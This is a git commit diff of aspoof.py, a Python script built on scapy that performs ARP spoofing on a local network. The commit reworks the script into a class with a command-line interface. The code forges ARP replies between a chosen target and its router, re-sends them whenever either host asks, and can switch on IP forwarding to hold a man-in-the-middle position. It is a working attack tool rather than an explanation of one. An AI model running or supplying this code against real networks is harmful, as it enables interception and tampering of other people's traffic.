0e552ec16ff62e3dbc30ac4915b8159131c66950
szabo-tibor <69170493+szabo-tibor@users.noreply.github.com>
2021-02-05 22:11:06 -0500

    CLI Interface added
    Code slightly reworked

--- aspoof.py
+++ aspoof.py
@@ -1,79 +1,118 @@
 import scapy.all as scapy
 from time import sleep
 import threading
+from argparse import ArgumentParser
 
-def getMac(ip):
-    arp_request = scapy.ARP(pdst=ip)
-    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
-    full = broadcast / arp_request
-    answer = scapy.srp(full, timeout = 6, verbose = False)[0]
-    return answer[0][1].hwsrc
 
-mymac = None
-targetip = "192.168.1.11"
-routerip = "192.168.1.1"
+class Spoof:
 
-targetmac = getMac(targetip)
-routermac = getMac(routerip)
+    def __init__(self,targetip,routerip,mac=None,ip_forward=False):
+        #TODO: Support for multiple targets
+        self.mymac = mac
+        self.targetip = targetip
+        self.routerip = routerip
+        
+        try:
+            self.targetmac = self.getMac(self.targetip)
+            self.routermac = self.getMac(self.routerip)
 
-def spoof(target_ip,target_mac,spoof_ip,attacker_mac=None):
-    if attacker_mac is None:
-        packet = scapy.ARP(op = 2, pdst = target_ip, hwdst = target_mac, psrc = spoof_ip)
-    else:
-        packet = scapy.ARP(op=2, pdst = target_ip, hwdst = target_mac, psrc = spoof_ip, hwsrc = attacker_mac)
+        except IndexError:
+            pass
+            raise Exception("Couldn't get targets MAC address")
 
-    scapy.send(packet, verbose = False)
+        if ip_forward:
+            self.ipForward()
 
-def showOptions(mymac,targetip,targetmac,routerip,routermac):
-    print("Your mac:", mymac)
-    print("Target IP:", targetip)
-    print("Target MAC:", targetmac)
-    print("Router IP:", routerip)
-    print("Router MAC:", routermac)
+    def getMac(self,ip):
 
-def t(pkt):
+        arp_request = scapy.ARP(pdst=ip)
+        broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
+        full = broadcast / arp_request
+        answer = scapy.srp(full, timeout = 6, verbose = False)[0]
+        return answer[0][1].hwsrc
 
-    if scapy.ARP in pkt and pkt[scapy.ARP].op == 1:
 
-        if pkt.psrc == targetip:
-            print(targetip, "is asking for", routerip, ", sending spoofed replies...")
-            for x in range(10):
-                spoof(targetip, targetmac, routerip,mymac)
-                sleep(0.5)
+    def spoof(self,target_ip,target_mac,spoof_ip,attacker_mac=None):
 
-        if pkt.psrc == routerip:
-            print(routerip, "is asking for", targetip, ", sending spoofed replies...")
-            for x in range(10):
-                spoof(routerip,routermac,targetip,mymac)
-                sleep(0.5)
+        if attacker_mac is None:
+            packet = scapy.ARP(op = 2,pdst = target_ip,hwdst = target_mac,psrc = spoof_ip)
+        else:
+            packet = scapy.ARP(op = 2,pdst = target_ip,hwdst = target_mac,psrc = spoof_ip,hwsrc = attacker_mac)
 
-def arp_monitor_callback(pkt):
+        scapy.send(packet, verbose = False)
 
-    threading.Thread(target=t, args=(pkt,)).start()
 
-def ipForward():
-    ip_forward_path = "/proc/sys/net/ipv4/ip_forward"
-    with open(ip_forward_path) as x:
-        if x.read() != 1:
-            with open(ip_forward_path, "w") as y:
-                y.write("1")
+    def showOptions(self):
+        if self.mymac == None:
+            print("Your MAC: Default")
+        else:
+            print("Your MAC:", self.mymac)
+        print("Target IP:", self.targetip)
+        print("Target MAC:", self.targetmac)
+        print("Router IP:", self.routerip)
+        print("Router MAC:", self.routermac)
+
+    def t(self,pkt):
+
+        if scapy.ARP in pkt and pkt[scapy.ARP].op == 1:
+
+            if pkt.psrc == self.targetip:
+                print(self.targetip, "is asking for", self.routerip, ", sending spoofed replies...")
+                for x in range(5):
+                    self.spoof(self.targetip,self.targetmac,self.routerip,self.mymac)
+                    sleep(0.5)
+
+            if pkt.psrc == self.routerip:
+                print(self.routerip, "is asking for", self.targetip, ", sending spoofed replies...")
+                for x in range(5):
+                    self.spoof(self.routerip,self.routermac,self.targetip,self.mymac)
+                    sleep(0.5)
+
+    def arpTrigger(self,pkt):
+
+        threading.Thread(target=self.t, args=(pkt,)).start()
+
+    def ipForward(self):
+
+        #TODO: Implement cross-platform IP forwarding
+
+        ip_forward_path = "/proc/sys/net/ipv4/ip_forward"
+        f = open(ip_forward_path)
+        
+        if f.read() == "1\n":
+            f.close()
+
+        else:
+            f.close()
+            print("Enabling IP Forwarding...")
+            f = open(ip_forward_path, "w")
+            f.write("1\n")
+            f.close()
+
+
+    def start(self):
+
+        for x in range(5):
+            self.spoof(self.targetip,self.targetmac,self.routerip,self.mymac)
+            self.spoof(self.routerip,self.routermac,self.targetip,self.mymac)
+            sleep(0.5)
+
+        f = "host {} and host {} and arp".format(self.targetip,self.routerip)
+        scapy.sniff(prn=self.arpTrigger, filter=f, store=0)
+
+        print("\nResting ARP cache and exiting...")
+        self.spoof(self.targetip,self.targetmac,self.routerip,self.routermac)
+        self.spoof(self.routerip,self.routermac,self.targetip,self.targetmac)
 
 def main():
-    showOptions(mymac,targetip,targetmac,routerip,routermac)
-
-    for x in range(5):
-        spoof(targetip,targetmac,routerip,mymac)
-        spoof(routerip,routermac,targetip,mymac)
-        sleep(0.5)
-
-    f = "host {} and host {} and arp".format(targetip,routerip)
-
-    scapy.sniff(prn=arp_monitor_callback, filter=f, store=0)
-
-    print("\nResting ARP cache and exiting...")
-    spoof(targetip,targetmac,routerip,routermac)
-    spoof(routerip,routermac,targetip,targetmac)
+    parser = ArgumentParser(description="Spoof ARP replies on your LAN")
+    parser.add_argument("-t", "--target", help="IP Address of target", required=True)
+    parser.add_argument("-r", "--router", help="IP Address of router", required=True)
+    parser.add_argument("-m", "--mac", help="Manually set your mac address (optional)", default=None)
+    cli_input = parser.parse_args()
+    spoofer = Spoof(cli_input.target,cli_input.router,cli_input.mac)
+    spoofer.showOptions()
+    spoofer.start()
 
 if __name__ == "__main__":
     main()
-
